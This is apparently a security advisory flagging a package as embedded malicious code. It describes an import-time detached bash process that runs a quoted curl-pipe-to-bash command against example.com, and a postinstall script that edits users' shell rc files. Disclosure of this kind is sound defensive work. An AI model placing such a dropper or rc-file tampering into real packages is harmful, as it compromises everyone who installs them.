summary: Import-time remote shell execution and unauthorized shell rc modification
details: On every require()/import of this package, src/index.js (lines 18-21) spawns a detached bash process that runs `curl -fsSL https://example.com/script.sh | bash`, fetching and executing remote shell content with no integrity check, no user consent, and stdio set to 'ignore' so failures are silent. The fetched payload is mutable, opaque, and unrelated to the package's stated GIS/infrastructure data purpose. Separately, the declared postinstall script (scripts/setup.js) locates the user's ~/.zshrc, ~/.bashrc, or ~/.profile and splices an `export MY_CUSTOM_VAR='test'` line into the middle of the file (with a.bak backup), demonstrating a mechanism to persistently mutate the installer's shell environment. The combination — import-time curl|bash dropper plus install-time shell rc tampering — is a textbook supply-chain attack shape.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
